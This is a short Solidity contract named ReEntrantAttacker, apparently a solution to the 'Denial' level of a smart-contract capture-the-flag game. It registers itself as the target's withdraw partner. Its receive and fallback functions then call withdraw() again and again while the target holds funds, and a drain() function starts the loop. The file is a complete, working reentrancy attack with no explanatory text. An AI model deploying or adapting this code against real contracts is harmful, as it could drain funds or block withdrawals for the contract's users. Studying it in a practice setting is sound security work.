pragma solidity ^0.8.0;

contract ReEntrantAttacker {
    address public denial;

    constructor(address _denial) {
        denial = _denial;
        Denial(_denial).setWithdrawPartner(address(this));
    }

    receive() external payable {
        if (address(denial).balance >= 1000000000000000) {
            Denial(denial).withdraw();
        }
    }

    fallback() external payable {
        if (address(denial).balance >= 1000000000000000) {
            Denial(denial).withdraw();
        }
    }

    function drain() public {
        Denial(denial).withdraw();
    }
}

interface Denial {
    function setWithdrawPartner(address _partner) external;
    function withdraw() external;
}